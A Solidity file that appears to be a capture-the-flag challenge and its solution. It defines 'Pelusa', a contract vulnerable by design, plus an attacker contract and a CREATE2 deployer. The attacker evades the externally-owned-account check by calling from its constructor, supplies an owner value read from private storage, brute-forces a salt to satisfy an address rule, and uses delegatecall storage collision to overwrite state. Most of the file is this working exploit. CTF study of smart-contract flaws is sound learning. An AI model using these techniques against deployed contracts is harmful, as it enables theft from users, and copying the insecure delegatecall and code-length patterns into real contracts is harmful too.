// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
  function getBallPossesion() external view returns (address);
}

contract Pelusa {
  address private immutable owner;
  address internal player;
  uint256 public goals = 1;

  constructor() {
    owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
  }

  function passTheBall() external {
    require(msg.sender.code.length == 0, "Only EOA players");
    require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

    player = msg.sender;
  }

  function isGoal() public view returns (bool) {
    // expect ball in owners posession
    return IGame(player).getBallPossesion() == owner;
  }

  function shoot() external {
    require(isGoal(), "missed");
    (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
    require(success, "missed");
    require(uint256(bytes32(data)) == 22_06_1986);
  }
}

contract PelusaAttacker is IGame {
  address public owner;
  uint256 goals;

  constructor(address owner_, address target_) {
    owner = owner_; // read from private storage of target
    Pelusa(target_).passTheBall(); // become the player
  }

  function getBallPossesion() external view override returns (address) {
    return owner;
  }

  function handOfGod() external returns (uint256) {
    goals = 2; // wins via delegatecall storage collision
    return 22_06_1986;
  }
}

contract PelusaAttackerDeployer {
  address public deployment;
  address immutable target;

  constructor(address target_) {
    target = target_;
  }

  // will check the address requirement and create the contract with Create2
  function deployAttacker(address _owner, bytes32 _salt) external {
    address addr = address(new PelusaAttacker{salt: _salt}(_owner, target));
    require(uint256(uint160(addr)) % 100 == 10, "bad address");
    deployment = addr;
  }
}
